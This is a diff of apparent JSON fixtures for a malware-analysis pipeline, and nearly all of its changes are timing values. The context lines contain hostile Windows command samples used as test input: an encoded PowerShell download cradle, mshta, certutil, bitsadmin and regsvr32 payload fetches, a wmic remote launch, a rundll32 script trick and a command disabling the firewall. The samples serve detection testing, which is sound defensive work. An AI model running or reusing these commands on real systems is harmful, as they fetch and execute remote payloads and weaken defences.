@@ -307,7 +307,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.098,
+              "elapsed_ms": 0.115,
               "status": "ok"
             },
             "yara": [
@@ -337,7 +337,7 @@
               }
             ]
           },
-          "elapsed_ms": 175.0,
+          "elapsed_ms": 160.1,
           "status": 200
         },
         "die": {
@@ -679,7 +679,7 @@
               ]
             }
           },
-          "elapsed_ms": 99.4,
+          "elapsed_ms": 128.5,
           "status": 200
         },
         "narrate": {
@@ -744,7 +744,7 @@
               ]
             }
           },
-          "elapsed_ms": 101.8,
+          "elapsed_ms": 110.4,
           "status": 200
         },
         "upload": {
@@ -772,7 +772,7 @@
             ],
             "text": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
           },
-          "elapsed_ms": 98.1,
+          "elapsed_ms": 104.6,
           "status": 200
         }
       },
@@ -935,7 +935,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.083,
+              "elapsed_ms": 0.113,
               "status": "ok"
             },
             "yara": [
@@ -965,7 +965,7 @@
               }
             ]
           },
-          "elapsed_ms": 154.6,
+          "elapsed_ms": 152.0,
           "status": 200
         },
         "die": {
@@ -1307,7 +1307,7 @@
               ]
             }
           },
-          "elapsed_ms": 105.8,
+          "elapsed_ms": 111.7,
           "status": 200
         },
         "narrate": {
@@ -1372,7 +1372,7 @@
               ]
             }
           },
-          "elapsed_ms": 94.3,
+          "elapsed_ms": 96.9,
           "status": 200
         },
         "upload": {
@@ -1400,7 +1400,7 @@
             ],
             "text": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
           },
-          "elapsed_ms": 100.3,
+          "elapsed_ms": 98.1,
           "status": 200
         }
       }
@@ -1588,7 +1588,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 500.888,
+              "elapsed_ms": 500.755,
               "status": "timeout"
             },
             "yara": [
@@ -1606,7 +1606,7 @@
               }
             ]
           },
-          "elapsed_ms": 651.0,
+          "elapsed_ms": 651.6,
           "status": 200
         },
         "die": {
@@ -1799,7 +1799,7 @@
               ]
             }
           },
-          "elapsed_ms": 95.1,
+          "elapsed_ms": 162.7,
           "status": 200
         },
         "narrate": {
@@ -1833,7 +1833,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 107.4,
+          "elapsed_ms": 95.2,
           "status": 200
         },
         "upload": {
@@ -1861,7 +1861,7 @@
             ],
             "text": "mshta.exe http://198.51.100.23/dropper.hta"
           },
-          "elapsed_ms": 95.4,
+          "elapsed_ms": 97.8,
           "status": 200
         }
       },
@@ -1937,7 +1937,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 501.186,
+              "elapsed_ms": 500.888,
               "status": "timeout"
             },
             "yara": [
@@ -1955,7 +1955,7 @@
               }
             ]
           },
-          "elapsed_ms": 666.5,
+          "elapsed_ms": 667.2,
           "status": 200
         },
         "die": {
@@ -2148,7 +2148,7 @@
               ]
             }
           },
-          "elapsed_ms": 100.8,
+          "elapsed_ms": 96.9,
           "status": 200
         },
         "narrate": {
@@ -2182,7 +2182,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 143.5,
+          "elapsed_ms": 119.4,
           "status": 200
         },
         "upload": {
@@ -2210,7 +2210,7 @@
             ],
             "text": "mshta.exe http://198.51.100.23/dropper.hta"
           },
-          "elapsed_ms": 106.7,
+          "elapsed_ms": 110.0,
           "status": 200
         }
       }
@@ -2474,7 +2474,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 501.431,
+              "elapsed_ms": 537.182,
               "status": "timeout"
             },
             "yara": [
@@ -2486,7 +2486,7 @@
               }
             ]
           },
-          "elapsed_ms": 675.3,
+          "elapsed_ms": 717.8,
           "status": 200
         },
         "die": {
@@ -2729,7 +2729,7 @@
               ]
             }
           },
-          "elapsed_ms": 98.6,
+          "elapsed_ms": 93.3,
           "status": 200
         },
         "narrate": {
@@ -2789,7 +2789,7 @@
               ]
             }
           },
-          "elapsed_ms": 113.6,
+          "elapsed_ms": 93.4,
           "status": 200
         },
         "upload": {
@@ -2817,7 +2817,7 @@
             ],
             "text": "certutil.exe -urlcache -split -f http://203.0.113.15/payload.exe C:\\Users\\Public\\update.exe"
           },
-          "elapsed_ms": 119.5,
+          "elapsed_ms": 105.9,
           "status": 200
         }
       },
@@ -2947,7 +2947,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 501.072,
+              "elapsed_ms": 501.078,
               "status": "timeout"
             },
             "yara": [
@@ -2959,7 +2959,7 @@
               }
             ]
           },
-          "elapsed_ms": 669.4,
+          "elapsed_ms": 653.5,
           "status": 200
         },
         "die": {
@@ -3202,7 +3202,7 @@
               ]
             }
           },
-          "elapsed_ms": 98.2,
+          "elapsed_ms": 99.4,
           "status": 200
         },
         "narrate": {
@@ -3262,7 +3262,7 @@
               ]
             }
           },
-          "elapsed_ms": 93.7,
+          "elapsed_ms": 120.5,
           "status": 200
         },
         "upload": {
@@ -3290,7 +3290,7 @@
             ],
             "text": "certutil.exe -urlcache -split -f http://203.0.113.15/payload.exe C:\\Users\\Public\\update.exe"
           },
-          "elapsed_ms": 96.9,
+          "elapsed_ms": 98.4,
           "status": 200
         }
       }
@@ -3493,7 +3493,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 501.499,
+              "elapsed_ms": 501.639,
               "status": "timeout"
             },
             "yara": [
@@ -3505,7 +3505,7 @@
               }
             ]
           },
-          "elapsed_ms": 661.3,
+          "elapsed_ms": 654.3,
           "status": 200
         },
         "die": {
@@ -3765,7 +3765,7 @@
               ]
             }
           },
-          "elapsed_ms": 106.9,
+          "elapsed_ms": 147.3,
           "status": 200
         },
         "narrate": {
@@ -3818,7 +3818,7 @@
               ]
             }
           },
-          "elapsed_ms": 97.8,
+          "elapsed_ms": 94.9,
           "status": 200
         },
         "upload": {
@@ -3846,7 +3846,7 @@
             ],
             "text": "regsvr32.exe /s /n /u /i:http://198.51.100.99/backdoor.sct scrobj.dll"
           },
-          "elapsed_ms": 116.7,
+          "elapsed_ms": 118.3,
           "status": 200
         }
       },
@@ -3935,7 +3935,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 501.358,
+              "elapsed_ms": 501.232,
               "status": "timeout"
             },
             "yara": [
@@ -3947,7 +3947,7 @@
               }
             ]
           },
-          "elapsed_ms": 657.1,
+          "elapsed_ms": 651.2,
           "status": 200
         },
         "die": {
@@ -4207,7 +4207,7 @@
               ]
             }
           },
-          "elapsed_ms": 96.8,
+          "elapsed_ms": 95.8,
           "status": 200
         },
         "narrate": {
@@ -4260,7 +4260,7 @@
               ]
             }
           },
-          "elapsed_ms": 97.4,
+          "elapsed_ms": 96.5,
           "status": 200
         },
         "upload": {
@@ -4288,7 +4288,7 @@
             ],
             "text": "regsvr32.exe /s /n /u /i:http://198.51.100.99/backdoor.sct scrobj.dll"
           },
-          "elapsed_ms": 113.1,
+          "elapsed_ms": 99.5,
           "status": 200
         }
       }
@@ -4643,7 +4643,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 500.826,
+              "elapsed_ms": 501.079,
               "status": "timeout"
             },
             "yara": [
@@ -4673,7 +4673,7 @@
               }
             ]
           },
-          "elapsed_ms": 666.8,
+          "elapsed_ms": 673.3,
           "status": 200
         },
         "die": {
@@ -5111,7 +5111,7 @@
               ]
             }
           },
-          "elapsed_ms": 97.7,
+          "elapsed_ms": 99.5,
           "status": 200
         },
         "narrate": {
@@ -5187,7 +5187,7 @@
               ]
             }
           },
-          "elapsed_ms": 95.7,
+          "elapsed_ms": 92.4,
           "status": 200
         },
         "upload": {
@@ -5215,7 +5215,7 @@
             ],
             "text": "wmic.exe /node:\"WORKSTATION-04\" process call create \"cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.7/b.ps1')\""
           },
-          "elapsed_ms": 96.2,
+          "elapsed_ms": 124.3,
           "status": 200
         }
       },
@@ -5408,7 +5408,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 501.196,
+              "elapsed_ms": 501.551,
               "status": "timeout"
             },
             "yara": [
@@ -5438,7 +5438,7 @@
               }
             ]
           },
-          "elapsed_ms": 657.7,
+          "elapsed_ms": 674.2,
           "status": 200
         },
         "die": {
@@ -5876,7 +5876,7 @@
               ]
             }
           },
-          "elapsed_ms": 109.5,
+          "elapsed_ms": 99.0,
           "status": 200
         },
         "narrate": {
@@ -5952,7 +5952,7 @@
               ]
             }
           },
-          "elapsed_ms": 101.3,
+          "elapsed_ms": 99.9,
           "status": 200
         },
         "upload": {
@@ -5980,7 +5980,7 @@
             ],
             "text": "wmic.exe /node:\"WORKSTATION-04\" process call create \"cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.7/b.ps1')\""
           },
-          "elapsed_ms": 111.9,
+          "elapsed_ms": 96.5,
           "status": 200
         }
       }
@@ -6092,7 +6092,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.097,
+              "elapsed_ms": 0.091,
               "status": "ok"
             },
             "yara": [
@@ -6104,7 +6104,7 @@
               }
             ]
           },
-          "elapsed_ms": 162.3,
+          "elapsed_ms": 154.1,
           "status": 200
         },
         "die": {
@@ -6121,7 +6121,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 94.9,
+          "elapsed_ms": 99.0,
           "status": 200
         },
         "narrate": {
@@ -6136,7 +6136,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 90.2,
+          "elapsed_ms": 104.0,
           "status": 200
         },
         "upload": {
@@ -6164,7 +6164,7 @@
             ],
             "text": "Get-ChildItem -Path \"C:\\Users\\jsmith\\Documents\" -Recurse -Include *.docx | Select-Object Name, Length, LastWriteTime | Export-Csv -Path \"C:\\Temp\\docs.csv\" -NoTypeInformation"
           },
-          "elapsed_ms": 109.5,
+          "elapsed_ms": 103.4,
           "status": 200
         }
       },
@@ -6202,7 +6202,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.131,
+              "elapsed_ms": 0.083,
               "status": "ok"
             },
             "yara": [
@@ -6214,7 +6214,7 @@
               }
             ]
           },
-          "elapsed_ms": 159.9,
+          "elapsed_ms": 192.0,
           "status": 200
         },
         "die": {
@@ -6231,7 +6231,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 100.1,
+          "elapsed_ms": 108.8,
           "status": 200
         },
         "narrate": {
@@ -6246,7 +6246,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 94.9,
+          "elapsed_ms": 99.5,
           "status": 200
         },
         "upload": {
@@ -6274,7 +6274,7 @@
             ],
             "text": "Get-ChildItem -Path \"C:\\Users\\jsmith\\Documents\" -Recurse -Include *.docx | Select-Object Name, Length, LastWriteTime | Export-Csv -Path \"C:\\Temp\\docs.csv\" -NoTypeInformation"
           },
-          "elapsed_ms": 103.5,
+          "elapsed_ms": 141.7,
           "status": 200
         }
       }
@@ -6443,7 +6443,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.101,
+              "elapsed_ms": 0.078,
               "status": "ok"
             },
             "yara": [
@@ -6455,7 +6455,7 @@
               }
             ]
           },
-          "elapsed_ms": 146.3,
+          "elapsed_ms": 157.7,
           "status": 200
         },
         "die": {
@@ -6550,7 +6550,7 @@
               ]
             }
           },
-          "elapsed_ms": 106.2,
+          "elapsed_ms": 134.8,
           "status": 200
         },
         "narrate": {
@@ -6583,7 +6583,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 157.3,
+          "elapsed_ms": 93.7,
           "status": 200
         },
         "upload": {
@@ -6611,7 +6611,7 @@
             ],
             "text": "netsh advfirewall set allprofiles state off"
           },
-          "elapsed_ms": 97.9,
+          "elapsed_ms": 100.3,
           "status": 200
         }
       },
@@ -6682,7 +6682,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.087,
+              "elapsed_ms": 0.088,
               "status": "ok"
             },
             "yara": [
@@ -6694,7 +6694,7 @@
               }
             ]
           },
-          "elapsed_ms": 147.1,
+          "elapsed_ms": 153.5,
           "status": 200
         },
         "die": {
@@ -6789,7 +6789,7 @@
               ]
             }
           },
-          "elapsed_ms": 100.6,
+          "elapsed_ms": 146.5,
           "status": 200
         },
         "narrate": {
@@ -6822,7 +6822,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 97.6,
+          "elapsed_ms": 93.3,
           "status": 200
         },
         "upload": {
@@ -6850,7 +6850,7 @@
             ],
             "text": "netsh advfirewall set allprofiles state off"
           },
-          "elapsed_ms": 145.3,
+          "elapsed_ms": 96.9,
           "status": 200
         }
       }
@@ -7131,7 +7131,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.084,
+              "elapsed_ms": 0.112,
               "status": "ok"
             },
             "yara": [
@@ -7161,7 +7161,7 @@
               }
             ]
           },
-          "elapsed_ms": 154.8,
+          "elapsed_ms": 156.5,
           "status": 200
         },
         "die": {
@@ -7466,7 +7466,7 @@
               ]
             }
           },
-          "elapsed_ms": 108.3,
+          "elapsed_ms": 101.1,
           "status": 200
         },
         "narrate": {
@@ -7542,7 +7542,7 @@
               ]
             }
           },
-          "elapsed_ms": 108.8,
+          "elapsed_ms": 104.4,
           "status": 200
         },
         "upload": {
@@ -7570,7 +7570,7 @@
             ],
             "text": "powershell -nop -w hidden -c \"$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbCAtRW5jIFNRQkZBRmdBS0FCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFUZ0JsQUhRQUxnQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQXBBQzRBUkFCdkFIY0FiZ0JzQUc4QVlRQmtBRk1BZEFCeUFHa0FiZ0JuQUNnQUp3Qm9BSFFBZEFCd0FEb0FMd0F2QURJQU1nQXpBQzRBTVRBQUxnQXhBRElBTHdCcEFHNEFad0FuQUNrQQ=='));iex $s\""
           },
-          "elapsed_ms": 105.1,
+          "elapsed_ms": 99.4,
           "status": 200
         }
       },
@@ -7713,7 +7713,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.104,
+              "elapsed_ms": 0.087,
               "status": "ok"
             },
             "yara": [
@@ -7743,7 +7743,7 @@
               }
             ]
           },
-          "elapsed_ms": 173.1,
+          "elapsed_ms": 157.9,
           "status": 200
         },
         "die": {
@@ -8048,7 +8048,7 @@
               ]
             }
           },
-          "elapsed_ms": 98.4,
+          "elapsed_ms": 97.3,
           "status": 200
         },
         "narrate": {
@@ -8124,7 +8124,7 @@
               ]
             }
           },
-          "elapsed_ms": 97.4,
+          "elapsed_ms": 97.0,
           "status": 200
         },
         "upload": {
@@ -8152,7 +8152,7 @@
             ],
             "text": "powershell -nop -w hidden -c \"$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbCAtRW5jIFNRQkZBRmdBS0FCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFUZ0JsQUhRQUxnQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQXBBQzRBUkFCdkFIY0FiZ0JzQUc4QVlRQmtBRk1BZEFCeUFHa0FiZ0JuQUNnQUp3Qm9BSFFBZEFCd0FEb0FMd0F2QURJQU1nQXpBQzRBTVRBQUxnQXhBRElBTHdCcEFHNEFad0FuQUNrQQ=='));iex $s\""
           },
-          "elapsed_ms": 98.4,
+          "elapsed_ms": 116.7,
           "status": 200
         }
       }
@@ -8262,12 +8262,12 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.157,
+              "elapsed_ms": 0.098,
               "status": "ok"
             },
             "yara": []
           },
-          "elapsed_ms": 161.5,
+          "elapsed_ms": 146.7,
           "status": 200
         },
         "die": {
@@ -8284,7 +8284,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 107.3,
+          "elapsed_ms": 120.0,
           "status": 200
         },
         "narrate": {
@@ -8299,7 +8299,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 90.1,
+          "elapsed_ms": 96.6,
           "status": 200
         },
         "upload": {
@@ -8325,7 +8325,7 @@
             "strings": [],
             "text": "dir"
           },
-          "elapsed_ms": 97.6,
+          "elapsed_ms": 101.7,
           "status": 200
         }
       },
@@ -8361,12 +8361,12 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.1,
+              "elapsed_ms": 0.112,
               "status": "ok"
             },
             "yara": []
           },
-          "elapsed_ms": 148.4,
+          "elapsed_ms": 165.2,
           "status": 200
         },
         "die": {
@@ -8383,7 +8383,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 92.3,
+          "elapsed_ms": 119.9,
           "status": 200
         },
         "narrate": {
@@ -8398,7 +8398,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 97.7,
+          "elapsed_ms": 89.6,
           "status": 200
         },
         "upload": {
@@ -8424,7 +8424,7 @@
             "strings": [],
             "text": "dir"
           },
-          "elapsed_ms": 99.0,
+          "elapsed_ms": 157.3,
           "status": 200
         }
       }
@@ -8503,7 +8503,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 105.1,
+          "elapsed_ms": 92.8,
           "status": 200
         },
         "narrate": {
@@ -8533,7 +8533,7 @@
             "strings": [],
             "text": null
           },
-          "elapsed_ms": 97.6,
+          "elapsed_ms": 104.1,
           "status": 200
         }
       },
@@ -8556,7 +8556,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 93.5,
+          "elapsed_ms": 96.3,
           "status": 200
         },
         "narrate": {
@@ -8586,7 +8586,7 @@
             "strings": [],
             "text": null
           },
-          "elapsed_ms": 101.2,
+          "elapsed_ms": 98.5,
           "status": 200
         }
       }
@@ -8803,7 +8803,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 500.883,
+              "elapsed_ms": 501.018,
               "status": "timeout"
             },
             "yara": [
@@ -8815,7 +8815,7 @@
               }
             ]
           },
-          "elapsed_ms": 675.3,
+          "elapsed_ms": 653.0,
           "status": 200
         },
         "die": {
@@ -9045,7 +9045,7 @@
               ]
             }
           },
-          "elapsed_ms": 92.6,
+          "elapsed_ms": 90.0,
           "status": 200
         },
         "narrate": {
@@ -9105,7 +9105,7 @@
               ]
             }
           },
-          "elapsed_ms": 94.2,
+          "elapsed_ms": 136.8,
           "status": 200
         },
         "upload": {
@@ -9133,7 +9133,7 @@
             ],
             "text": "bitsadmin.exe /transfer job1 /priority foreground http://198.51.100.42/m.exe C:\\ProgramData\\m.exe"
           },
-          "elapsed_ms": 95.3,
+          "elapsed_ms": 97.0,
           "status": 200
         }
       },
@@ -9228,7 +9228,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 501.518,
+              "elapsed_ms": 500.803,
               "status": "timeout"
             },
             "yara": [
@@ -9240,7 +9240,7 @@
               }
             ]
           },
-          "elapsed_ms": 654.2,
+          "elapsed_ms": 664.1,
           "status": 200
         },
         "die": {
@@ -9470,7 +9470,7 @@
               ]
             }
           },
-          "elapsed_ms": 107.2,
+          "elapsed_ms": 96.0,
           "status": 200
         },
         "narrate": {
@@ -9530,7 +9530,7 @@
               ]
             }
           },
-          "elapsed_ms": 100.3,
+          "elapsed_ms": 96.8,
           "status": 200
         },
         "upload": {
@@ -9558,7 +9558,7 @@
             ],
             "text": "bitsadmin.exe /transfer job1 /priority foreground http://198.51.100.42/m.exe C:\\ProgramData\\m.exe"
           },
-          "elapsed_ms": 100.2,
+          "elapsed_ms": 103.6,
           "status": 200
         }
       }
@@ -9805,7 +9805,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.107,
+              "elapsed_ms": 0.093,
               "status": "ok"
             },
             "yara": [
@@ -9823,7 +9823,7 @@
               }
             ]
           },
-          "elapsed_ms": 151.9,
+          "elapsed_ms": 154.0,
           "status": 200
         },
         "die": {
@@ -10277,7 +10277,7 @@
               ]
             }
           },
-          "elapsed_ms": 113.1,
+          "elapsed_ms": 115.4,
           "status": 200
         },
         "narrate": {
@@ -10335,7 +10335,7 @@
               ]
             }
           },
-          "elapsed_ms": 95.7,
+          "elapsed_ms": 95.9,
           "status": 200
         },
         "upload": {
@@ -10363,7 +10363,7 @@
             ],
             "text": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write(\"\\74script language=jscript>eval(new ActiveXObject(\\\"WScript.Shell\\\").RegRead(\\\"HKCU\\\\\\\\software\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\run\\\\\\\\evil\\\"));\\74/script>\")"
           },
-          "elapsed_ms": 95.3,
+          "elapsed_ms": 139.1,
           "status": 200
         }
       },
@@ -10490,7 +10490,7 @@
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.072,
+              "elapsed_ms": 0.111,
               "status": "ok"
             },
             "yara": [
@@ -10508,7 +10508,7 @@
               }
             ]
           },
-          "elapsed_ms": 164.0,
+          "elapsed_ms": 154.4,
           "status": 200
         },
         "die": {
@@ -10962,7 +10962,7 @@
               ]
             }
           },
-          "elapsed_ms": 104.8,
+          "elapsed_ms": 97.7,
           "status": 200
         },
         "narrate": {
@@ -11020,7 +11020,7 @@
               ]
             }
           },
-          "elapsed_ms": 114.1,
+          "elapsed_ms": 94.5,
           "status": 200
         },
         "upload": {
@@ -11048,7 +11048,7 @@
             ],
             "text": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write(\"\\74script language=jscript>eval(new ActiveXObject(\\\"WScript.Shell\\\").RegRead(\\\"HKCU\\\\\\\\software\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\run\\\\\\\\evil\\\"));\\74/script>\")"
           },
-          "elapsed_ms": 95.2,
+          "elapsed_ms": 101.2,
           "status": 200
         }
       }
